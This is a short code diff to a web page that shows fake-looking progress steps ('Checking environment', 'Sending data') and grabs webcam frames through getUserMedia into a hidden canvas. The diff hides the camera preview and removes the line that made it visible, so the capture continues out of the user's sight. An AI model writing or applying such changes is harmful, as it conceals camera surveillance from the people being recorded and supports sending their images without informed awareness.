@@ -63,7 +63,7 @@
   <div class="step" id="step5">Step 5: Checking environment...</div>
   <div class="step" id="step6">Step 6: Sending data...</div>
 
-  <video id="video" width="300" autoplay></video>
+<video id="video" autoplay playsinline style="display: none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
 
   <div id="progress"><div id="progress-bar">0%</div></div>
@@ -115,7 +115,6 @@
       return new Promise((resolve, reject) => {
         navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
           video.srcObject = stream;
-          video.style.display = 'block';
           setTimeout(() => {
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
